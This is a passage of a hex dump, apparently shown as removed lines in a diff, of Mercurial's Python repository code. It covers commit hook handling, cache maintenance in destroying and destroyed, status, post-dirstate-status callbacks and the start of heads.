-0001d3b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d3c0: 2020 7372 203d 2073 7562 2e63 6f6d 6d69    sr = sub.commi
-0001d3d0: 7428 6363 7478 2e5f 7465 7874 2c20 7573  t(cctx._text, us
-0001d3e0: 6572 2c20 6461 7465 290a 2020 2020 2020  er, date).      
-0001d3f0: 2020 2020 2020 2020 2020 2020 2020 6e65                ne
-0001d400: 7773 7461 7465 5b73 5d20 3d20 286e 6577  wstate[s] = (new
-0001d410: 7374 6174 655b 735d 5b30 5d2c 2073 7229  state[s][0], sr)
-0001d420: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0001d430: 2073 7562 7265 706f 7574 696c 2e77 7269   subrepoutil.wri
-0001d440: 7465 7374 6174 6528 7365 6c66 2c20 6e65  testate(self, ne
-0001d450: 7773 7461 7465 290a 0a20 2020 2020 2020  wstate)..       
-0001d460: 2020 2020 2070 312c 2070 3220 3d20 7365       p1, p2 = se
-0001d470: 6c66 2e64 6972 7374 6174 652e 7061 7265  lf.dirstate.pare
-0001d480: 6e74 7328 290a 2020 2020 2020 2020 2020  nts().          
-0001d490: 2020 686f 6f6b 7031 2c20 686f 6f6b 7032    hookp1, hookp2
-0001d4a0: 203d 2068 6578 2870 3129 2c20 2870 3220   = hex(p1), (p2 
-0001d4b0: 213d 2073 656c 662e 6e75 6c6c 6964 2061  != self.nullid a
-0001d4c0: 6e64 2068 6578 2870 3229 206f 7220 6227  nd hex(p2) or b'
-0001d4d0: 2729 0a20 2020 2020 2020 2020 2020 2074  ').            t
-0001d4e0: 7279 3a0a 2020 2020 2020 2020 2020 2020  ry:.            
-0001d4f0: 2020 2020 7365 6c66 2e68 6f6f 6b28 0a20      self.hook(. 
-0001d500: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d510: 2020 2062 2270 7265 636f 6d6d 6974 222c     b"precommit",
-0001d520: 2074 6872 6f77 3d54 7275 652c 2070 6172   throw=True, par
-0001d530: 656e 7431 3d68 6f6f 6b70 312c 2070 6172  ent1=hookp1, par
-0001d540: 656e 7432 3d68 6f6f 6b70 320a 2020 2020  ent2=hookp2.    
-0001d550: 2020 2020 2020 2020 2020 2020 290a 2020              ).  
-0001d560: 2020 2020 2020 2020 2020 2020 2020 7769                wi
-0001d570: 7468 2073 656c 662e 7472 616e 7361 6374  th self.transact
-0001d580: 696f 6e28 6227 636f 6d6d 6974 2729 3a0a  ion(b'commit'):.
-0001d590: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d5a0: 2020 2020 7265 7420 3d20 7365 6c66 2e63      ret = self.c
-0001d5b0: 6f6d 6d69 7463 7478 2863 6374 782c 2054  ommitctx(cctx, T
-0001d5c0: 7275 6529 0a20 2020 2020 2020 2020 2020  rue).           
-0001d5d0: 2020 2020 2020 2020 2023 2075 7064 6174           # updat
-0001d5e0: 6520 626f 6f6b 6d61 726b 732c 2064 6972  e bookmarks, dir
-0001d5f0: 7374 6174 6520 616e 6420 6d65 7267 6573  state and merges
-0001d600: 7461 7465 0a20 2020 2020 2020 2020 2020  tate.           
-0001d610: 2020 2020 2020 2020 2062 6f6f 6b6d 6172           bookmar
-0001d620: 6b73 2e75 7064 6174 6528 7365 6c66 2c20  ks.update(self, 
-0001d630: 5b70 312c 2070 325d 2c20 7265 7429 0a20  [p1, p2], ret). 
-0001d640: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d650: 2020 2063 6374 782e 6d61 726b 636f 6d6d     cctx.markcomm
-0001d660: 6974 7465 6428 7265 7429 0a20 2020 2020  itted(ret).     
-0001d670: 2020 2020 2020 2020 2020 2020 2020 206d                 m
-0001d680: 732e 7265 7365 7428 290a 2020 2020 2020  s.reset().      
-0001d690: 2020 2020 2020 6578 6365 7074 3a20 2023        except:  #
-0001d6a0: 2072 652d 7261 6973 6573 0a20 2020 2020   re-raises.     
-0001d6b0: 2020 2020 2020 2020 2020 2069 6620 6564             if ed
-0001d6c0: 6974 6564 3a0a 2020 2020 2020 2020 2020  ited:.          
-0001d6d0: 2020 2020 2020 2020 2020 7365 6c66 2e75            self.u
-0001d6e0: 692e 7772 6974 6528 0a20 2020 2020 2020  i.write(.       
-0001d6f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d700: 205f 2862 276e 6f74 653a 2063 6f6d 6d69   _(b'note: commi
-0001d710: 7420 6d65 7373 6167 6520 7361 7665 6420  t message saved 
-0001d720: 696e 2025 735c 6e27 2920 2520 6d73 675f  in %s\n') % msg_
-0001d730: 7061 7468 0a20 2020 2020 2020 2020 2020  path.           
-0001d740: 2020 2020 2020 2020 2029 0a20 2020 2020           ).     
-0001d750: 2020 2020 2020 2020 2020 2020 2020 2073                 s
-0001d760: 656c 662e 7569 2e77 7269 7465 280a 2020  elf.ui.write(.  
-0001d770: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d780: 2020 2020 2020 5f28 0a20 2020 2020 2020        _(.       
-0001d790: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d7a0: 2020 2020 2062 226e 6f74 653a 2075 7365       b"note: use
-0001d7b0: 2027 6867 2063 6f6d 6d69 7420 2d2d 6c6f   'hg commit --lo
-0001d7c0: 6766 696c 6520 220a 2020 2020 2020 2020  gfile ".        
-0001d7d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d7e0: 2020 2020 6222 2573 202d 2d65 6469 7427      b"%s --edit'
-0001d7f0: 2074 6f20 7265 7573 6520 6974 5c6e 220a   to reuse it\n".
-0001d800: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d810: 2020 2020 2020 2020 290a 2020 2020 2020          ).      
-0001d820: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d830: 2020 2520 6d73 675f 7061 7468 0a20 2020    % msg_path.   
-0001d840: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d850: 2029 0a20 2020 2020 2020 2020 2020 2020   ).             
-0001d860: 2020 2072 6169 7365 0a0a 2020 2020 2020     raise..      
-0001d870: 2020 6465 6620 636f 6d6d 6974 686f 6f6b    def commithook
-0001d880: 2875 6e75 7365 645f 7375 6363 6573 7329  (unused_success)
-0001d890: 3a0a 2020 2020 2020 2020 2020 2020 2320  :.            # 
-0001d8a0: 6861 636b 2066 6f72 2063 6f6d 6d61 6e64  hack for command
-0001d8b0: 2074 6861 7420 7573 6520 6120 7465 6d70   that use a temp
-0001d8c0: 6f72 6172 7920 636f 6d6d 6974 2028 6567  orary commit (eg
-0001d8d0: 3a20 6869 7374 6564 6974 290a 2020 2020  : histedit).    
-0001d8e0: 2020 2020 2020 2020 2320 7465 6d70 6f72          # tempor
-0001d8f0: 6172 7920 636f 6d6d 6974 2067 6f74 2073  ary commit got s
-0001d900: 7472 6970 7065 6420 6265 666f 7265 2068  tripped before h
-0001d910: 6f6f 6b20 7265 6c65 6173 650a 2020 2020  ook release.    
-0001d920: 2020 2020 2020 2020 6966 2073 656c 662e          if self.
-0001d930: 6368 616e 6765 6c6f 672e 6861 736e 6f64  changelog.hasnod
-0001d940: 6528 7265 7429 3a0a 2020 2020 2020 2020  e(ret):.        
-0001d950: 2020 2020 2020 2020 7365 6c66 2e68 6f6f          self.hoo
-0001d960: 6b28 0a20 2020 2020 2020 2020 2020 2020  k(.             
-0001d970: 2020 2020 2020 2062 2263 6f6d 6d69 7422         b"commit"
-0001d980: 2c20 6e6f 6465 3d68 6578 2872 6574 292c  , node=hex(ret),
-0001d990: 2070 6172 656e 7431 3d68 6f6f 6b70 312c   parent1=hookp1,
-0001d9a0: 2070 6172 656e 7432 3d68 6f6f 6b70 320a   parent2=hookp2.
-0001d9b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001d9c0: 290a 0a20 2020 2020 2020 2073 656c 662e  )..        self.
-0001d9d0: 5f61 6674 6572 6c6f 636b 2863 6f6d 6d69  _afterlock(commi
-0001d9e0: 7468 6f6f 6b29 0a20 2020 2020 2020 2072  thook).        r
-0001d9f0: 6574 7572 6e20 7265 740a 0a20 2020 2040  eturn ret..    @
-0001da00: 756e 6669 6c74 6572 6564 6d65 7468 6f64  unfilteredmethod
-0001da10: 0a20 2020 2064 6566 2063 6f6d 6d69 7463  .    def commitc
-0001da20: 7478 2873 656c 662c 2063 7478 2c20 6572  tx(self, ctx, er
-0001da30: 726f 723d 4661 6c73 652c 206f 7269 6763  ror=False, origc
-0001da40: 7478 3d4e 6f6e 6529 3a0a 2020 2020 2020  tx=None):.      
-0001da50: 2020 7265 7475 726e 2063 6f6d 6d69 742e    return commit.
-0001da60: 636f 6d6d 6974 6374 7828 7365 6c66 2c20  commitctx(self, 
-0001da70: 6374 782c 2065 7272 6f72 3d65 7272 6f72  ctx, error=error
-0001da80: 2c20 6f72 6967 6374 783d 6f72 6967 6374  , origctx=origct
-0001da90: 7829 0a0a 2020 2020 4075 6e66 696c 7465  x)..    @unfilte
-0001daa0: 7265 646d 6574 686f 640a 2020 2020 6465  redmethod.    de
-0001dab0: 6620 6465 7374 726f 7969 6e67 2873 656c  f destroying(sel
-0001dac0: 6629 3a0a 2020 2020 2020 2020 2222 2249  f):.        """I
-0001dad0: 6e66 6f72 6d20 7468 6520 7265 706f 7369  nform the reposi
-0001dae0: 746f 7279 2074 6861 7420 6e6f 6465 7320  tory that nodes 
-0001daf0: 6172 6520 6162 6f75 7420 746f 2062 6520  are about to be 
-0001db00: 6465 7374 726f 7965 642e 0a20 2020 2020  destroyed..     
-0001db10: 2020 2049 6e74 656e 6465 6420 666f 7220     Intended for 
-0001db20: 7573 6520 6279 2073 7472 6970 2061 6e64  use by strip and
-0001db30: 2072 6f6c 6c62 6163 6b2c 2073 6f20 7468   rollback, so th
-0001db40: 6572 6527 7320 6120 636f 6d6d 6f6e 0a20  ere's a common. 
-0001db50: 2020 2020 2020 2070 6c61 6365 2066 6f72         place for
-0001db60: 2061 6e79 7468 696e 6720 7468 6174 2068   anything that h
-0001db70: 6173 2074 6f20 6265 2064 6f6e 6520 6265  as to be done be
-0001db80: 666f 7265 2064 6573 7472 6f79 696e 6720  fore destroying 
-0001db90: 6869 7374 6f72 792e 0a0a 2020 2020 2020  history...      
-0001dba0: 2020 5468 6973 2069 7320 6d6f 7374 6c79    This is mostly
-0001dbb0: 2075 7365 6675 6c20 666f 7220 7361 7669   useful for savi
-0001dbc0: 6e67 2073 7461 7465 2074 6861 7420 6973  ng state that is
-0001dbd0: 2069 6e20 6d65 6d6f 7279 2061 6e64 2077   in memory and w
-0001dbe0: 6169 7469 6e67 0a20 2020 2020 2020 2074  aiting.        t
-0001dbf0: 6f20 6265 2066 6c75 7368 6564 2077 6865  o be flushed whe
-0001dc00: 6e20 7468 6520 6375 7272 656e 7420 6c6f  n the current lo
-0001dc10: 636b 2069 7320 7265 6c65 6173 6564 2e20  ck is released. 
-0001dc20: 4265 6361 7573 6520 6120 6361 6c6c 2074  Because a call t
-0001dc30: 6f0a 2020 2020 2020 2020 6465 7374 726f  o.        destro
-0001dc40: 7965 6420 6973 2069 6d6d 696e 656e 742c  yed is imminent,
-0001dc50: 2074 6865 2072 6570 6f20 7769 6c6c 2062   the repo will b
-0001dc60: 6520 696e 7661 6c69 6461 7465 6420 6361  e invalidated ca
-0001dc70: 7573 696e 6720 7468 6f73 650a 2020 2020  using those.    
-0001dc80: 2020 2020 6368 616e 6765 7320 746f 2073      changes to s
-0001dc90: 7461 7920 696e 206d 656d 6f72 7920 2877  tay in memory (w
-0001dca0: 6169 7469 6e67 2066 6f72 2074 6865 206e  aiting for the n
-0001dcb0: 6578 7420 756e 6c6f 636b 292c 206f 7220  ext unlock), or 
-0001dcc0: 7661 6e69 7368 0a20 2020 2020 2020 2063  vanish.        c
-0001dcd0: 6f6d 706c 6574 656c 792e 0a20 2020 2020  ompletely..     
-0001dce0: 2020 2022 2222 0a20 2020 2020 2020 2023     """.        #
-0001dcf0: 2057 6865 6e20 7573 696e 6720 7468 6520   When using the 
-0001dd00: 7361 6d65 206c 6f63 6b20 746f 2063 6f6d  same lock to com
-0001dd10: 6d69 7420 616e 6420 7374 7269 702c 2074  mit and strip, t
-0001dd20: 6865 2070 6861 7365 6361 6368 6520 6973  he phasecache is
-0001dd30: 206c 6566 740a 2020 2020 2020 2020 2320   left.        # 
-0001dd40: 6469 7274 7920 6166 7465 7220 636f 6d6d  dirty after comm
-0001dd50: 6974 7469 6e67 2e20 5468 656e 2077 6865  itting. Then whe
-0001dd60: 6e20 7765 2073 7472 6970 2c20 7468 6520  n we strip, the 
-0001dd70: 7265 706f 2069 7320 696e 7661 6c69 6461  repo is invalida
-0001dd80: 7465 642c 0a20 2020 2020 2020 2023 2063  ted,.        # c
-0001dd90: 6175 7369 6e67 2074 686f 7365 2063 6861  ausing those cha
-0001dda0: 6e67 6573 2074 6f20 6469 7361 7070 6561  nges to disappea
-0001ddb0: 722e 0a20 2020 2020 2020 2069 6620 275f  r..        if '_
-0001ddc0: 7068 6173 6563 6163 6865 2720 696e 2076  phasecache' in v
-0001ddd0: 6172 7328 7365 6c66 293a 0a20 2020 2020  ars(self):.     
-0001dde0: 2020 2020 2020 2073 656c 662e 5f70 6861         self._pha
-0001ddf0: 7365 6361 6368 652e 7772 6974 6528 290a  secache.write().
-0001de00: 0a20 2020 2040 756e 6669 6c74 6572 6564  .    @unfiltered
-0001de10: 6d65 7468 6f64 0a20 2020 2064 6566 2064  method.    def d
-0001de20: 6573 7472 6f79 6564 2873 656c 6629 3a0a  estroyed(self):.
-0001de30: 2020 2020 2020 2020 2222 2249 6e66 6f72          """Infor
-0001de40: 6d20 7468 6520 7265 706f 7369 746f 7279  m the repository
-0001de50: 2074 6861 7420 6e6f 6465 7320 6861 7665   that nodes have
-0001de60: 2062 6565 6e20 6465 7374 726f 7965 642e   been destroyed.
-0001de70: 0a20 2020 2020 2020 2049 6e74 656e 6465  .        Intende
-0001de80: 6420 666f 7220 7573 6520 6279 2073 7472  d for use by str
-0001de90: 6970 2061 6e64 2072 6f6c 6c62 6163 6b2c  ip and rollback,
-0001dea0: 2073 6f20 7468 6572 6527 7320 6120 636f   so there's a co
-0001deb0: 6d6d 6f6e 0a20 2020 2020 2020 2070 6c61  mmon.        pla
-0001dec0: 6365 2066 6f72 2061 6e79 7468 696e 6720  ce for anything 
-0001ded0: 7468 6174 2068 6173 2074 6f20 6265 2064  that has to be d
-0001dee0: 6f6e 6520 6166 7465 7220 6465 7374 726f  one after destro
-0001def0: 7969 6e67 2068 6973 746f 7279 2e0a 2020  ying history..  
-0001df00: 2020 2020 2020 2222 220a 2020 2020 2020        """.      
-0001df10: 2020 2320 5768 656e 206f 6e65 2074 7269    # When one tri
-0001df20: 6573 2074 6f3a 0a20 2020 2020 2020 2023  es to:.        #
-0001df30: 2031 2920 6465 7374 726f 7920 6e6f 6465   1) destroy node
-0001df40: 7320 7468 7573 2063 616c 6c69 6e67 2074  s thus calling t
-0001df50: 6869 7320 6d65 7468 6f64 2028 652e 672e  his method (e.g.
-0001df60: 2073 7472 6970 290a 2020 2020 2020 2020   strip).        
-0001df70: 2320 3229 2075 7365 2070 6861 7365 6361  # 2) use phaseca
-0001df80: 6368 6520 736f 6d65 7768 6572 6520 2865  che somewhere (e
-0001df90: 2e67 2e20 636f 6d6d 6974 290a 2020 2020  .g. commit).    
-0001dfa0: 2020 2020 230a 2020 2020 2020 2020 2320      #.        # 
-0001dfb0: 7468 656e 2032 2920 7769 6c6c 2066 6169  then 2) will fai
-0001dfc0: 6c20 6265 6361 7573 6520 7468 6520 7068  l because the ph
-0001dfd0: 6173 6563 6163 6865 2063 6f6e 7461 696e  asecache contain
-0001dfe0: 7320 6e6f 6465 7320 7468 6174 2077 6572  s nodes that wer
-0001dff0: 650a 2020 2020 2020 2020 2320 7265 6d6f  e.        # remo
-0001e000: 7665 642e 2057 6520 6361 6e20 6569 7468  ved. We can eith
-0001e010: 6572 2072 656d 6f76 6520 7068 6173 6563  er remove phasec
-0001e020: 6163 6865 2066 726f 6d20 7468 6520 6669  ache from the fi
-0001e030: 6c65 6361 6368 652c 0a20 2020 2020 2020  lecache,.       
-0001e040: 2023 2063 6175 7369 6e67 2069 7420 746f   # causing it to
-0001e050: 2072 656c 6f61 6420 6e65 7874 2074 696d   reload next tim
-0001e060: 6520 6974 2069 7320 6163 6365 7373 6564  e it is accessed
-0001e070: 2c20 6f72 2073 696d 706c 7920 6669 6c74  , or simply filt
-0001e080: 6572 0a20 2020 2020 2020 2023 2074 6865  er.        # the
-0001e090: 2072 656d 6f76 6564 206e 6f64 6573 206e   removed nodes n
-0001e0a0: 6f77 2061 6e64 2077 7269 7465 2074 6865  ow and write the
-0001e0b0: 2075 7064 6174 6564 2063 6163 6865 2e0a   updated cache..
-0001e0c0: 2020 2020 2020 2020 7365 6c66 2e5f 7068          self._ph
-0001e0d0: 6173 6563 6163 6865 2e66 696c 7465 7275  asecache.filteru
-0001e0e0: 6e6b 6e6f 776e 2873 656c 6629 0a20 2020  nknown(self).   
-0001e0f0: 2020 2020 2073 656c 662e 5f70 6861 7365       self._phase
-0001e100: 6361 6368 652e 7772 6974 6528 290a 0a20  cache.write().. 
-0001e110: 2020 2020 2020 2023 2072 6566 7265 7368         # refresh
-0001e120: 2061 6c6c 2072 6570 6f73 6974 6f72 7920   all repository 
-0001e130: 6361 6368 6573 0a20 2020 2020 2020 2073  caches.        s
-0001e140: 656c 662e 7570 6461 7465 6361 6368 6573  elf.updatecaches
-0001e150: 2829 0a0a 2020 2020 2020 2020 2320 456e  ()..        # En
-0001e160: 7375 7265 2074 6865 2070 6572 7369 7374  sure the persist
-0001e170: 656e 7420 7461 6720 6361 6368 6520 6973  ent tag cache is
-0001e180: 2075 7064 6174 6564 2e20 2044 6f69 6e67   updated.  Doing
-0001e190: 2069 7420 6e6f 770a 2020 2020 2020 2020   it now.        
-0001e1a0: 2320 6d65 616e 7320 7468 6174 2074 6865  # means that the
-0001e1b0: 2074 6167 2063 6163 6865 206f 6e6c 7920   tag cache only 
-0001e1c0: 6861 7320 746f 2077 6f72 7279 2061 626f  has to worry abo
-0001e1d0: 7574 2064 6573 7472 6f79 6564 0a20 2020  ut destroyed.   
-0001e1e0: 2020 2020 2023 2068 6561 6473 2069 6d6d       # heads imm
-0001e1f0: 6564 6961 7465 6c79 2061 6674 6572 2061  ediately after a
-0001e200: 2073 7472 6970 2f72 6f6c 6c62 6163 6b2e   strip/rollback.
-0001e210: 2020 5468 6174 2069 6e20 7475 726e 0a20    That in turn. 
-0001e220: 2020 2020 2020 2023 2067 7561 7261 6e74         # guarant
-0001e230: 6565 7320 7468 6174 2022 6361 6368 6574  ees that "cachet
-0001e240: 6970 203d 3d20 6375 7272 656e 7474 6970  ip == currenttip
-0001e250: 2220 2863 6f6d 7061 7269 6e67 2062 6f74  " (comparing bot
-0001e260: 6820 7265 760a 2020 2020 2020 2020 2320  h rev.        # 
-0001e270: 616e 6420 6e6f 6465 2920 616c 7761 7973  and node) always
-0001e280: 206d 6561 6e73 206e 6f20 6e6f 6465 7320   means no nodes 
-0001e290: 6861 7665 2062 6565 6e20 6164 6465 6420  have been added 
-0001e2a0: 6f72 2064 6573 7472 6f79 6564 2e0a 0a20  or destroyed... 
-0001e2b0: 2020 2020 2020 2023 2058 5858 2074 6869         # XXX thi
-0001e2c0: 7320 6973 2073 7562 6f70 7469 6d61 6c20  s is suboptimal 
-0001e2d0: 7768 656e 2071 7265 6672 6573 6827 696e  when qrefresh'in
-0001e2e0: 673a 2077 6520 7374 7269 7020 7468 6520  g: we strip the 
-0001e2f0: 6375 7272 656e 740a 2020 2020 2020 2020  current.        
-0001e300: 2320 6865 6164 2c20 7265 6672 6573 6820  # head, refresh 
-0001e310: 7468 6520 7461 6720 6361 6368 652c 2074  the tag cache, t
-0001e320: 6865 6e20 696d 6d65 6469 6174 656c 7920  hen immediately 
-0001e330: 6164 6420 6120 6e65 7720 6865 6164 2e0a  add a new head..
-0001e340: 2020 2020 2020 2020 2320 4275 7420 4920          # But I 
-0001e350: 7468 696e 6b20 646f 696e 6720 6974 2074  think doing it t
-0001e360: 6869 7320 7761 7920 6973 206e 6563 6573  his way is neces
-0001e370: 7361 7279 2066 6f72 2074 6865 2022 696e  sary for the "in
-0001e380: 7374 616e 740a 2020 2020 2020 2020 2320  stant.        # 
-0001e390: 7461 6720 6361 6368 6520 7265 7472 6965  tag cache retrie
-0001e3a0: 7661 6c22 2063 6173 6520 746f 2077 6f72  val" case to wor
-0001e3b0: 6b2e 0a20 2020 2020 2020 2073 656c 662e  k..        self.
-0001e3c0: 696e 7661 6c69 6461 7465 2829 0a0a 2020  invalidate()..  
-0001e3d0: 2020 6465 6620 7374 6174 7573 280a 2020    def status(.  
-0001e3e0: 2020 2020 2020 7365 6c66 2c0a 2020 2020        self,.    
-0001e3f0: 2020 2020 6e6f 6465 313d 6227 2e27 2c0a      node1=b'.',.
-0001e400: 2020 2020 2020 2020 6e6f 6465 323d 4e6f          node2=No
-0001e410: 6e65 2c0a 2020 2020 2020 2020 6d61 7463  ne,.        matc
-0001e420: 683d 4e6f 6e65 2c0a 2020 2020 2020 2020  h=None,.        
-0001e430: 6967 6e6f 7265 643d 4661 6c73 652c 0a20  ignored=False,. 
-0001e440: 2020 2020 2020 2063 6c65 616e 3d46 616c         clean=Fal
-0001e450: 7365 2c0a 2020 2020 2020 2020 756e 6b6e  se,.        unkn
-0001e460: 6f77 6e3d 4661 6c73 652c 0a20 2020 2020  own=False,.     
-0001e470: 2020 206c 6973 7473 7562 7265 706f 733d     listsubrepos=
-0001e480: 4661 6c73 652c 0a20 2020 2029 3a0a 2020  False,.    ):.  
-0001e490: 2020 2020 2020 2727 2761 2063 6f6e 7665        '''a conve
-0001e4a0: 6e69 656e 6365 206d 6574 686f 6420 7468  nience method th
-0001e4b0: 6174 2063 616c 6c73 206e 6f64 6531 2e73  at calls node1.s
-0001e4c0: 7461 7475 7328 6e6f 6465 3229 2727 270a  tatus(node2)'''.
-0001e4d0: 2020 2020 2020 2020 7265 7475 726e 2073          return s
-0001e4e0: 656c 665b 6e6f 6465 315d 2e73 7461 7475  elf[node1].statu
-0001e4f0: 7328 0a20 2020 2020 2020 2020 2020 206e  s(.            n
-0001e500: 6f64 6532 2c20 6d61 7463 682c 2069 676e  ode2, match, ign
-0001e510: 6f72 6564 2c20 636c 6561 6e2c 2075 6e6b  ored, clean, unk
-0001e520: 6e6f 776e 2c20 6c69 7374 7375 6272 6570  nown, listsubrep
-0001e530: 6f73 0a20 2020 2020 2020 2029 0a0a 2020  os.        )..  
-0001e540: 2020 6465 6620 6164 6470 6f73 7464 7373    def addpostdss
-0001e550: 7461 7475 7328 7365 6c66 2c20 7073 293a  tatus(self, ps):
-0001e560: 0a20 2020 2020 2020 2022 2222 4164 6420  .        """Add 
-0001e570: 6120 6361 6c6c 6261 636b 2074 6f20 7275  a callback to ru
-0001e580: 6e20 7769 7468 696e 2074 6865 2077 6c6f  n within the wlo
-0001e590: 636b 2c20 6174 2074 6865 2070 6f69 6e74  ck, at the point
-0001e5a0: 2061 7420 7768 6963 6820 7374 6174 7573   at which status
-0001e5b0: 0a20 2020 2020 2020 2066 6978 7570 7320  .        fixups 
-0001e5c0: 6861 7070 656e 2e0a 0a20 2020 2020 2020  happen...       
-0001e5d0: 204f 6e20 7374 6174 7573 2063 6f6d 706c   On status compl
-0001e5e0: 6574 696f 6e2c 2063 616c 6c62 6163 6b28  etion, callback(
-0001e5f0: 7763 7478 2c20 7374 6174 7573 2920 7769  wctx, status) wi
-0001e600: 6c6c 2062 6520 6361 6c6c 6564 2077 6974  ll be called wit
-0001e610: 6820 7468 650a 2020 2020 2020 2020 776c  h the.        wl
-0001e620: 6f63 6b20 6865 6c64 2c20 756e 6c65 7373  ock held, unless
-0001e630: 2074 6865 2064 6972 7374 6174 6520 6861   the dirstate ha
-0001e640: 7320 6368 616e 6765 6420 6672 6f6d 2075  s changed from u
-0001e650: 6e64 6572 6e65 6174 6820 6f72 2074 6865  nderneath or the
-0001e660: 2077 6c6f 636b 0a20 2020 2020 2020 2063   wlock.        c
-0001e670: 6f75 6c64 6e27 7420 6265 2067 7261 6262  ouldn't be grabb
-0001e680: 6564 2e0a 0a20 2020 2020 2020 2043 616c  ed...        Cal
-0001e690: 6c62 6163 6b73 2073 686f 756c 6420 6e6f  lbacks should no
-0001e6a0: 7420 6361 7074 7572 6520 616e 6420 7573  t capture and us
-0001e6b0: 6520 6120 6361 6368 6564 2063 6f70 7920  e a cached copy 
-0001e6c0: 6f66 2074 6865 2064 6972 7374 6174 6520  of the dirstate 
-0001e6d0: 2d2d 0a20 2020 2020 2020 2069 7420 6d69  --.        it mi
-0001e6e0: 6768 7420 6368 616e 6765 2069 6e20 7468  ght change in th
-0001e6f0: 6520 6d65 616e 7768 696c 652e 2049 6e73  e meanwhile. Ins
-0001e700: 7465 6164 2c20 7468 6579 2073 686f 756c  tead, they shoul
-0001e710: 6420 6163 6365 7373 2074 6865 0a20 2020  d access the.   
-0001e720: 2020 2020 2064 6972 7374 6174 6520 7669       dirstate vi
-0001e730: 6120 7763 7478 2e72 6570 6f28 292e 6469  a wctx.repo().di
-0001e740: 7273 7461 7465 2e0a 0a20 2020 2020 2020  rstate...       
-0001e750: 2054 6869 7320 6c69 7374 2069 7320 656d   This list is em
-0001e760: 7074 6965 6420 6f75 7420 6166 7465 7220  ptied out after 
-0001e770: 6561 6368 2073 7461 7475 7320 7275 6e20  each status run 
-0001e780: 2d2d 2065 7874 656e 7369 6f6e 7320 7368  -- extensions sh
-0001e790: 6f75 6c64 0a20 2020 2020 2020 206d 616b  ould.        mak
-0001e7a0: 6520 7375 7265 2069 7420 6164 6473 2074  e sure it adds t
-0001e7b0: 6f20 7468 6973 206c 6973 7420 6561 6368  o this list each
-0001e7c0: 2074 696d 6520 6469 7273 7461 7465 2e73   time dirstate.s
-0001e7d0: 7461 7475 7320 6973 2063 616c 6c65 642e  tatus is called.
-0001e7e0: 0a20 2020 2020 2020 2045 7874 656e 7369  .        Extensi
-0001e7f0: 6f6e 7320 7368 6f75 6c64 2061 6c73 6f20  ons should also 
-0001e800: 6d61 6b65 2073 7572 6520 7468 6579 2064  make sure they d
-0001e810: 6f6e 2774 2063 616c 6c20 7468 6973 2066  on't call this f
-0001e820: 6f72 2073 7461 7475 7365 730a 2020 2020  or statuses.    
-0001e830: 2020 2020 7468 6174 2064 6f6e 2774 2069      that don't i
-0001e840: 6e76 6f6c 7665 2074 6865 2064 6972 7374  nvolve the dirst
-0001e850: 6174 652e 0a20 2020 2020 2020 2022 2222  ate..        """
-0001e860: 0a0a 2020 2020 2020 2020 2320 5468 6520  ..        # The 
-0001e870: 6c69 7374 2069 7320 6c6f 6361 7465 6420  list is located 
-0001e880: 6865 7265 2066 6f72 2075 6e69 7175 656e  here for uniquen
-0001e890: 6573 7320 7265 6173 6f6e 7320 2d2d 2069  ess reasons -- i
-0001e8a0: 7420 6973 2061 6374 7561 6c6c 790a 2020  t is actually.  
-0001e8b0: 2020 2020 2020 2320 6d61 6e61 6765 6420        # managed 
-0001e8c0: 6279 2074 6865 2077 6f72 6b69 6e67 6374  by the workingct
-0001e8d0: 782c 2062 7574 2074 6861 7420 6973 6e27  x, but that isn'
-0001e8e0: 7420 756e 6971 7565 2070 6572 2d72 6570  t unique per-rep
-0001e8f0: 6f2e 0a20 2020 2020 2020 2073 656c 662e  o..        self.
-0001e900: 5f70 6f73 7464 7373 7461 7475 732e 6170  _postdsstatus.ap
-0001e910: 7065 6e64 2870 7329 0a0a 2020 2020 6465  pend(ps)..    de
-0001e920: 6620 706f 7374 6473 7374 6174 7573 2873  f postdsstatus(s
-0001e930: 656c 6629 3a0a 2020 2020 2020 2020 2222  elf):.        ""
-0001e940: 2255 7365 6420 6279 2077 6f72 6b69 6e67  "Used by working
-0001e950: 6374 7820 746f 2067 6574 2074 6865 206c  ctx to get the l
-0001e960: 6973 7420 6f66 2070 6f73 742d 6469 7273  ist of post-dirs
-0001e970: 7461 7465 2d73 7461 7475 7320 686f 6f6b  tate-status hook
-0001e980: 732e 2222 220a 2020 2020 2020 2020 7265  s.""".        re
-0001e990: 7475 726e 2073 656c 662e 5f70 6f73 7464  turn self._postd
-0001e9a0: 7373 7461 7475 730a 0a20 2020 2064 6566  sstatus..    def
-0001e9b0: 2063 6c65 6172 706f 7374 6473 7374 6174   clearpostdsstat
-0001e9c0: 7573 2873 656c 6629 3a0a 2020 2020 2020  us(self):.      
-0001e9d0: 2020 2222 2255 7365 6420 6279 2077 6f72    """Used by wor
-0001e9e0: 6b69 6e67 6374 7820 746f 2063 6c65 6172  kingctx to clear
-0001e9f0: 2070 6f73 742d 6469 7273 7461 7465 2d73   post-dirstate-s
-0001ea00: 7461 7475 7320 686f 6f6b 732e 2222 220a  tatus hooks.""".
-0001ea10: 2020 2020 2020 2020 6465 6c20 7365 6c66          del self
-0001ea20: 2e5f 706f 7374 6473 7374 6174 7573 5b3a  ._postdsstatus[:
-0001ea30: 5d0a 0a20 2020 2064 6566 2068 6561 6473  ]..    def heads
-0001ea40: 2873 656c 662c 2073 7461 7274 3d4e 6f6e  (self, start=Non
-0001ea50: 6529 3a0a 2020 2020 2020 2020 6966 2073  e):.        if s
-0001ea60: 7461 7274 2069 7320 4e6f 6e65 3a0a 2020  tart is None:.  
-0001ea70: 2020 2020 2020 2020 2020 636c 203d 2073            cl = s
-0001ea80: 656c 662e 6368 616e 6765 6c6f 670a 2020  elf.changelog.  
-0001ea90: 2020 2020 2020 2020 2020 6865 6164 7265            headre
-0001eaa0: 7673 203d 2072 6576 6572 7365 6428 636c  vs = reversed(cl
-0001eab0: 2e68 6561 6472 6576 7328 2929 0a20 2020  .headrevs()).   
